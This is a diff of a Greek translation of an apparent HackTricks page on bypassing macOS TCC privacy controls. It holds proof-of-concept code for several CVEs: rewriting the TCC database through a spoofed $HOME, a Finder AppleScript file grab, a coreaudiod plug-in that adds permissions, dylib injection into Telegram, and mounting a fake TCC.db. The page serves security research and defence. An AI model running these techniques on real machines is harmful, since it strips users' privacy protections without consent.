@@ -1,4 +1,4 @@
-# macOS TCC Παρακάμψεις
+# macOS TCC Bypasses
 
 <details>
 
@@ -19,6 +19,7 @@
 ### Παράκαμψη Εγγραφής
 
 Αυτό δεν είναι μια παράκαμψη, απλώς είναι πώς λειτουργεί το TCC: **Δεν προστατεύει από την εγγραφή**. Αν ο Τερματικός **δεν έχει πρόσβαση για να διαβάσει την επιφάνεια εργασίας ενός χρήστη, μπορεί ακόμα να γράψει μέσα σε αυτήν**:
+
 ```shell-session
 username@hostname ~ % ls Desktop
 ls: Desktop: Operation not permitted
@@ -28,13 +29,14 @@ ls: Desktop: Operation not permitted
 username@hostname ~ % cat Desktop/lalala
 asd
 ```
+
 Το **επεκτεινόμενο χαρακτηριστικό `com.apple.macl`** προστίθεται στο νέο **αρχείο** για να δώσει πρόσβαση στην **εφαρμογή δημιουργού** να το διαβάσει.
 
 ### TCC ClickJacking
 
 Είναι δυνατόν να **τοποθετηθεί ένα παράθυρο πάνω από την προτροπή TCC** για να κάνει ο χρήστης **αποδοχή** χωρίς να το παρατηρήσει. Μπορείτε να βρείτε ένα PoC στο [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**
 
-<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>
+<figure><img src="https://github.com/carlospolop/hacktricks/blob/gr/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>
 
 ### TCC Αίτηση με αυθαίρετο όνομα
 
@@ -75,7 +77,7 @@ asd
 
 **Το iMovie** και το **Garageband** είχαν αυτό το δικαίωμα και άλλα που επιτρέπονταν.
 
-Για περισσότερες **πληροφορίες** σχετικά με την εκμετάλλευση για την **απόκτηση των tokens του iCloud** από αυτό το δικαίωμα, ελέγξτε την ομιλία: [**#OBTS v5.0: "Τι συμβαίνει στο Mac σας, Μένει στο iCloud της Apple;!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+Για περισσότερες **πληροφορίες** σχετικά με την εκμετάλλευση για την **απόκτηση των tokens του iCloud** από αυτό το δικαίωμα, ελέγξτε την ομιλία: [**#OBTS v5.0: "Τι συμβαίνει στο Mac σας, Μένει στο iCloud της Apple;!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)
 
 ### kTCCServiceAppleEvents / Αυτοματισμός
 
@@ -108,12 +110,15 @@ end tell
 end tell
 ```
 {% endcode %}
+
 ```bash
 osascript iterm.script
 ```
+
 #### Πάνω από το Finder
 
 Ή αν μια εφαρμογή έχει πρόσβαση πάνω από το Finder, μπορεί να εκτελέσει ένα σενάριο όπως το παρακάτω:
+
 ```applescript
 set a_user to do shell script "logname"
 tell application "Finder"
@@ -123,6 +128,7 @@ set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alia
 end tell
 do shell script "rm " & POSIX path of (copyFile as alias)
 ```
+
 ## Με βάση τη συμπεριφορά της εφαρμογής
 
 ### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>
@@ -132,6 +138,7 @@ do shell script "rm " & POSIX path of (copyFile as alias)
 Σύμφωνα με [αυτήν τη δημοσίευση στο Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) και επειδή το δαίμονα TCC τρέχει μέσω `launchd` εντός του τρέχοντος τομέα χρήστη, είναι δυνατό να **ελέγχεται όλες τις μεταβλητές περιβάλλοντος** που περνούν σε αυτόν.\
 Έτσι, ένας **επιτιθέμενος θα μπορούσε να ορίσει τη μεταβλητή περιβάλλοντος `$HOME`** στο **`launchctl`** ώστε να δείχνει σε ένα **ελεγχόμενο κατάλογο**, **επανεκκινήσει** το **δαίμονα TCC**, και στη συνέχεια **να τροποποιήσει απευθείας τη βάση δεδομένων TCC** για να δώσει στον εαυτό του **κάθε δικαίωμα TCC που είναι διαθέσιμο** χωρίς ποτέ να ζητήσει άδεια από τον τελικό χρήστη.\
 PoC:
+
 ```bash
 # reset database just in case (no cheating!)
 $> tccutil reset All
@@ -158,6 +165,7 @@ NULL,
 # list Documents directory without prompting the end user
 $> ls ~/Documents
 ```
+
 ### CVE-2021-30761 - Σημειώσεις
 
 Οι Σημειώσεις είχαν πρόσβαση σε προστατευμένες τοποθεσίες TCC, αλλά όταν δημιουργείται μια σημείωση αυτή δημιουργείται σε μια **μη προστατευμένη τοποθεσία**. Έτσι, θα μπορούσατε να ζητήσετε από τις Σημειώσεις να αντιγράψουν ένα προστατευμένο αρχείο σε μια σημείωση (σε μια μη προστατευμένη τοποθεσία) και στη συνέχεια να έχετε πρόσβαση στο αρχείο:
@@ -189,11 +197,13 @@ $> ls ~/Documents
 Εάν η μεταβλητή περιβάλλοντος **`SQLITE_AUTO_TRACE`** είναι ορισμένη, η βιβλιοθήκη **`libsqlite3.dylib`** θα αρχίσει να **καταγράφει** όλα τα ερωτήματα SQL. Πολλές εφαρμογές χρησιμοποιούσαν αυτήν τη βιβλιοθήκη, οπότε ήταν δυνατόν να καταγραφούν όλα τα ερωτήματα τους SQLite.
 
 Πολλές εφαρμογές της Apple χρησιμοποιούσαν αυτήν τη βιβλιοθήκη για να έχουν πρόσβαση σε προστατευμένες πληροφορίες TCC.
+
 ```bash
 # Set this env variable everywhere
 launchctl setenv SQLITE_AUTO_TRACE 1
 ```
-### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407
+
+### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407
 
 Αυτή η **μεταβλητή περιβάλλοντος χρησιμοποιείται από το πλαίσιο `Metal`** το οποίο είναι μια εξάρτηση από διάφορα προγράμματα, κυρίως το `Music`, το οποίο έχει FDA.
 
@@ -264,12 +274,14 @@ launchctl setenv SQLITE_AUTO_TRACE 1
 Το δεύτερο POC χρησιμοποίησε το **`/usr/libexec/configd`** το οποίο είχε `com.apple.private.tcc.allow` με την τιμή `kTCCServiceSystemPolicySysAdminFiles`.\
 Ήταν δυνατό να εκτελεστεί το **`configd`** με την επιλογή **`-t`**, όπου ένας επιτιθέμενος θα μπορούσε να καθορίσει ένα **προσαρμοσμένο Bundle για φόρτωση**. Επομένως, η εκμετάλλευση **αντικαθιστά** τη μέθοδο **`dsexport`** και **`dsimport`** για την αλλαγή του καταλόγου αρχικού του χρήστη με μια **ενσωμάτωση κώδικα configd**.
 
-Για περισσότερες πληροφορίες ελέγξτε την [**αρχική αναφορά**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user
+Για περισσότερες πληροφορίες ελέγξτε την \[**αρχική αναφορά**]\(https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user
+
 ### CVE-2020-29621 - Coreaudiod
 
 Το δυαδικό **`/usr/sbin/coreaudiod`** είχε τα entitlements `com.apple.security.cs.disable-library-validation` και `com.apple.private.tcc.manager`. Το πρώτο επιτρέπει την **εισαγωγή κώδικα** και το δεύτερο του δίνει πρόσβαση για **διαχείριση του TCC**.
 
 Αυτό το δυαδικό επέτρεπε τη φόρτωση **plug-ins τρίτων** από τον φάκελο `/Library/Audio/Plug-Ins/HAL`. Επομένως, ήταν δυνατό να **φορτωθεί ένα πρόσθετο και να καταχραστούν οι άδειες του TCC** με αυτό το PoC:
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <Security/Security.h>
@@ -296,6 +308,7 @@ add_tcc_entry();
 NSLog(@"[+] Exploitation finished...");
 exit(0);
 ```
+
 Για περισσότερες πληροφορίες ελέγξτε την [**αρχική αναφορά**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).
 
 ### Προσθήκες Επιπέδου Αφαίρεσης Συσκευής (Device Abstraction Layer - DAL)
@@ -309,6 +322,7 @@ exit(0);
 ### Firefox
 
 Η εφαρμογή Firefox είχε τα entitlements `com.apple.security.cs.disable-library-validation` και `com.apple.security.cs.allow-dyld-environment-variables`:
+
 ```xml
 codesign -d --entitlements :- /Applications/Firefox.app
 Executable=/Applications/Firefox.app/Contents/MacOS/firefox
@@ -334,6 +348,7 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 </dict>
 </plist>
 ```
+
 Για περισσότερες πληροφορίες σχετικά με το πώς να εκμεταλλευτείτε εύκολα αυτό, [**ελέγξτε την αρχική αναφορά**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).
 
 ### CVE-2020-10006
@@ -345,6 +360,7 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 Το Telegram είχε τα entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** και **`com.apple.security.cs.disable-library-validation`**, οπότε ήταν δυνατό να το καταχραστείτε για να **αποκτήσετε πρόσβαση στα δικαιώματά του** όπως η εγγραφή με την κάμερα. Μπορείτε να [**βρείτε το φορτίο στην ανάλυση**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
 
 Σημειώστε πώς να χρησιμοποιήσετε τη μεταβλητή περιβάλλοντος για να φορτώσετε ένα βιβλιοθήκη ένα **προσαρμοσμένο plist** δημιουργήθηκε για να ενσωματώσει αυτή τη βιβλιοθήκη και ο **`launchctl`** χρησιμοποιήθηκε για να την εκκινήσει:
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -374,6 +390,7 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 ```bash
 launchctl load com.telegram.launcher.plist
 ```
+
 ## Με ανοιχτές κλήσεις
 
 Είναι δυνατόν να γίνει κλήση στην **`open`** ακόμα και όταν είναι σε λειτουργία αμμόλογης
@@ -383,6 +400,7 @@ launchctl load com.telegram.launcher.plist
 Είναι αρκετά συνηθισμένο να δίνεται πρόσβαση **Πλήρους Πρόσβασης Δίσκου (FDA)** στο τερματικό, τουλάχιστον σε υπολογιστές που χρησιμοποιούνται από τεχνικά άτομα. Και είναι δυνατόν να γίνει κλήση σε σενάρια **`.terminal`** χρησιμοποιώντας το.
 
 Τα σενάρια **`.terminal`** είναι αρχεία plist όπως το παρακάτω με την εντολή που θα εκτελεστεί στο κλειδί **`CommandString`**:
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -400,7 +418,9 @@ launchctl load com.telegram.launcher.plist
 </dict>
 </plist>
 ```
+
 Μια εφαρμογή θα μπορούσε να γράψει ένα σενάριο τερματικού σε έναν τόπο όπως το /tmp και να το εκκινήσει με ένα ερώτημα όπως:
+
 ```objectivec
 // Write plist in /tmp/tcc.terminal
 [...]
@@ -411,6 +431,7 @@ task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
 exploit_location]; task.standardOutput = pipe;
 [task launch];
 ```
+
 ## Με την προσάρτηση
 
 ### CVE-2020-9771 - παράκαμψη TCC του mount\_apfs και ανύψωση προνομίων
@@ -445,6 +466,7 @@ ls /tmp/snap/Users/admin_user # This will work
 ### CVE-2021-1784 & CVE-2021-30808 - Τοποθέτηση πάνω από το αρχείο TCC
 
 Ακόμα κι αν το αρχείο TCC DB είναι προστατευμένο, ήταν δυνατό να **τοποθετηθεί πάνω στον κατάλογο** ένα νέο αρχείο TCC.db:
+
 ```bash
 # CVE-2021-1784
 ## Mount over Library/Application\ Support/com.apple.TCC
@@ -454,7 +476,7 @@ hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TC
 ## Mount over ~/Library
 hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
 ```
-{% endcode %}
+
 ```python
 # This was the python function to create the dmg
 def create_dmg():
@@ -465,6 +487,7 @@ os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
 os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
 os.system("hdiutil detach /tmp/mnt 1>/dev/null")
 ```
+
 Ελέγξτε τον **πλήρη εκμεταλλευτή** στο [**αρχικό άρθρο**](https://theevilbit.github.io/posts/cve-2021-30808/).
 
 ### asr
